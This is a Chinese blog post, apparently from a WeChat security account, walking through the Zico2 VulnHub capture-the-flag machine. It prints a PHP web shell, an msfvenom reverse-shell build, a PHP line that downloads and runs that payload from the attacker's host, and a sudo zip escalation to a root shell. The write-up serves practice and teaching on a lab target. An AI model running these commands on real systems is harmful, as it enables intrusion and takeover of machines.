> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3wjO3KsrrZepxcjNsHQKdA)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **32** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/zico2-1,210/

靶机难度：中级（CTF）

靶机发布日期：2017 年 6 月 19 日

靶机描述：

Zico 试图建立自己的网站，但在选择要使用的 CMS 时遇到了一些麻烦。在尝试了一些受欢迎的方法后，他决定建立自己的方法。那是个好主意吗？

提示：枚举，枚举和枚举！

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6DdW6admPmWicucEOicwONQBeMWRA7Pq57A9xCTGbIWomiboqObS0bEetoo2qW2hHk2E5GOcuQYUqSlQT5BKsDqRQ/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/M39rvicGKTibrmYlY2VW5XChia77yhteBC7iarNdYSwicq64NZrCHeSZqRpsFRTZkpfgclSWaibqftONNMWLkz6QjyoQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvCPcLHEbhrIgmrs910daicCjvKYgq4snnszrneef7iamKEuoibiaSYOtMrg/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvR5RkADKTrTQBib0mAEZ3ygVicSCMtyBEuzibmJsKX12IogcgnspKYzdPw/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.128

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvOr4HhvbVXG8vFHSXE596oI2fI6PrZmReiatNLKpq0aqF58B0CDCMUtQ/640?wx_fmt=png)

nmap 扫到了 22、80、111、50702 端口是开启的...

检出 Web 端口：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvibAAkhDriccAae88LJU5mzTLUCVOjow7AOmLGZaJFXFJKv9tdmbUCc7A/640?wx_fmt=png)

往下翻...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvCtKNoH54RmwqMImUSdJbib4tIvD1DU8xmPK4GH0IG8BNsgIw2UfMpIg/640?wx_fmt=png)

点击进入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvsNGz17jZ4OZQ9KPTRAy9edOV642PNzgFAuzTzxa1489UThacg95tOg/640?wx_fmt=png)

可以看到 tools.html 页面的 URL... 可能容易受到 LFI 的影响.... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufv1ZWeFleEUqcaV1LXmrL9IiaqlujRwIsE3BL0oylN3MAzXAW4Nv1I3Ow/640?wx_fmt=png)

尝试获取 LFI 并成功使用 /../../etc/passwd.... 这边找到了 zico 用户...

前面提示让我们枚举，那我就枚举爆破看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufv8QUpzgylke2OB9ysibhZlHjwkaCljY6Deo32BHF5uvZyVI7IiboBXYUQ/640?wx_fmt=png)

/dbadmin / 浏览这个目录发现了 test_db.php 文件.... 访问它

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvrKnO9ua31t67ibcZnQFicvibGexib3iaAue9sib79tBiaVUJSSibOrIKufvurQ/640?wx_fmt=png)

可以看到一个 php 数据库登录页面以及版本名称....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvelU7ESWRoaE6uCV0Z38KfL1rgKUCic1HWWbticbiavA1SiavKCZC7PoHqw/640?wx_fmt=png)

使用默认密码 admin，成功登录进来...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvurR030CHMGlsteqWg6a0aWSHRyx7bPVm1Ugt5CZziasDR7fwI7ibrHPw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufv8ZL1ErSibVRQ6Q1xFPDt9NkLnwMRSdrBJeWtphxLNNGtZSN0kpU6XXA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvEliafwPwfgPN7LJju5f2rdTnOhbkI109h2MXsv0sSHicqJbaWZhCb3vA/640?wx_fmt=png)

可以看出，这里目前我发现有三种方法可以提权...

文件上传...LFI 注入... 写 shell 在页面插入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvO7SuKXmsVr3r9SOe6Uib7FJAyIBiapaE8btS2riaJa7IgwJ2IIluhs0Zw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvjQMgLsgcIWFvdibib6eBhcOKLfRxwBjd9zSnsFBEEia4O14mXYsXfP2Kg/640?wx_fmt=png)

查看到步骤后，按照进行即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvP5bvzuzdawEsWFHkiaq45XMNUbebsA6ia95RG8LC7icqNqXn9vVYeDBBA/640?wx_fmt=png)

```
<?php echo system($_GET["cmd"]); ?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvPBn0vlT7khRib2O7ib2aQVcibzy9mpPoWicfdk5fcg6rRbrBS5fVCItKiaA/640?wx_fmt=png)  

可以看到 php 代码脚本已保存在数据库中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvFXy6j6qHvV4iaGemS0jIYC4sfqqu3icKhXvkzYxzRE1d6Tlo9U1UVHhQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6DdW6admPmWicucEOicwONQBeMWRA7Pq57A9xCTGbIWomiboqObS0bEetoo2qW2hHk2E5GOcuQYUqSlQT5BKsDqRQ/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/M39rvicGKTibrmYlY2VW5XChia77yhteBC7iarNdYSwicq64NZrCHeSZqRpsFRTZkpfgclSWaibqftONNMWLkz6QjyoQ/640?wx_fmt=png)

这边执行了该文件... 可以看到位于 www-data 中....

这边思路就很简单了，先在本地创建个 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvAFdL698LbYsAfygaOMjicibkziakTdcDibicPG8sGicPdNfmCedkKW03fHNA/640?wx_fmt=png)

```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.56.103 lport=4444 -f elf > shell
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufveDibMB2Pd8WzohHjXDVZYlZQgCSMJAacDjk8yicDStk7IoIoKkpAjkSA/640?wx_fmt=png)

开启 msf，我无奈的不知道为什么很简单的上传个 shell 上去，打开就能获得权限，可是死活就不行，我就只能求助 MSF 先把这台靶机拿下先，不然心态爆炸了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvZKQZSCVW2LU6MR1mibopliaQhjJTK7sETflVYvtV16HzqkkYh2IEx2Qw/640?wx_fmt=png)

```
<?php system("cd /tmp;wget http://192.168.56.103:8000/shell;chmod +x shell;./shell");?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvJLmCvguJYiaWwAVP3RltWZzpSRsGOm2dic51TWicdX1dWBDPRwNonsXOA/640?wx_fmt=png)

重新访问下即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvvn7Hc9uhmClic5eFUHEpyVianYPZHic2WQMBzaRAiax0EmQRwlibOaM2cfA/640?wx_fmt=png)

这边成功获得权限... 这边进入 zico 用户后，发现了 wordpress 目录，进去肯定有一个 wp-config.php 文件可以查看账号密码的... 常识

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufv0VS9iaEAe15urULI9urOjlIGdebwVwvJYicjyfqaXh7lB0NcOyAH1Cew/640?wx_fmt=png)

```
sWfCsfJSPV9H3AmQzw8
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvdeZxUdv1BbdDlsyqicKAZG49BA2MJIia0T1ib3CorJMAwMwZBMcvL0HwQ/640?wx_fmt=png)

ssh 成功登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPyxNJjpfmicxdFgD3ibBcufvPLtdrib3UibH4HhxzkucQntzjAVCulDmXdwwTX2mtjcAPKLwQHqpZn1Q/640?wx_fmt=png)

```
sudo zip /tmp/nisha.zip /home/zico/raj -T --unzip-command="sh -c /bin/bash"
```

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

可以看到用户可以以 root 用户身份运行 tar 和 zip 命令，而无需输入任何密码...

将文件 raj 压缩为文件，然后将其移动到 / tmp/nisha.zip 文件夹，最后将其解压缩，然后弹出 root 壳...

成功获得 root 权限和找到 flag.txt....

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)